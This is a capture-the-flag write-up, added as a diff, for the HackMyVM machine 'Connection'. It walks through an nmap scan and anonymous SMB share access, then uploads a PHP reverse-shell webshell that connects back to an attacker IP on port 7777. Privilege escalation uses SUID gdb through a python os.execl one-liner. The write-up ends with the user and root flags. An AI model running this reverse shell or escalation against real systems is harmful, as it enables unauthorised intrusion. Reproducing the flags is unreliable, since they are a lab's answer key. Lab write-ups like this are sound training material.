@@ -1,0 +1,90 @@
+🟢 Executive Summary
+Severity: High
+Description:
+Initial access was achieved through anonymous SMB access to the share folder on the target machine. The share contained a web directory (`html`) where a PHP webshell was uploaded, allowing remote code execution as the `www-data` user. Privilege escalation to root was accomplished by exploiting the SUID permission on `/usr/bin/gdb`, granting full system compromise.
+
+🖥️ Scope and Environment
+Platform: HackMyVM
+
+Machine: Connection
+
+IP Address: 192.168.1.135
+
+Date of Analysis: 24/08/2025
+
+Difficulty: Medium
+
+🛠 Tools Used
+- nmap  
+- enum4linux  
+- smbclient  
+- nc (netcat)  
+- gdb  
+
+🔍 Findings Description
+
+### 4.1 Port Scanning
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.135
+nmap -sCV -p22,80,139,445 192.168.1.135
+Results:
+
+22/tcp – SSH (OpenSSH 7.9p1 Debian 10+deb10u2)
+
+80/tcp – HTTP (Apache/2.4.38)
+
+139/tcp – SMB (Samba smbd 3.X - 4.X)
+
+445/tcp – SMB (Samba smbd 4.9.5-Debian)
+
+The HTTP service displayed the default Apache page. Further enumeration focused on SMB shares.
+
+4.2 SMB Enumeration
+Anonymous access allowed connecting to the share folder:
+
+smbclient //192.168.1.135/share -N
+Contents:
+
+html/
+Inside html:
+
+index.html
+4.3 Webshell Upload
+Created a PHP webshell:
+
+<?php
+$sock=fsockopen("192.168.1.142",7777);
+$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+?>
+Uploaded to SMB share:
+
+put webshell.php
+Listener started on attacker machine:
+
+nc -lvnp 7777
+Accessed webshell:
+
+URL = http://192.168.1.135/webshell.php
+Obtained shell as www-data.
+
+Sanitization of Shell (TTY)
+
+script /dev/null -c bash
+
+4.4 Privilege Escalation
+Checked SUID binaries:
+
+find / -type f -perm -4000 -ls 2>/dev/null
+Finding:
+
+/usr/bin/gdb = SUID root
+Exploited GDB to escalate privileges:
+
+gdb -nx -ex 'python import os; os.execl("/bin/bash", "sh", "-p")' -ex quit
+Result: Obtained root shell.
+
+🏁 Flags Obtained
+
+User: 3f491443a2a6aa82bc86a3cda8c39617
+
+Root: a7c6ea4931ab86fb54c5400204474a39
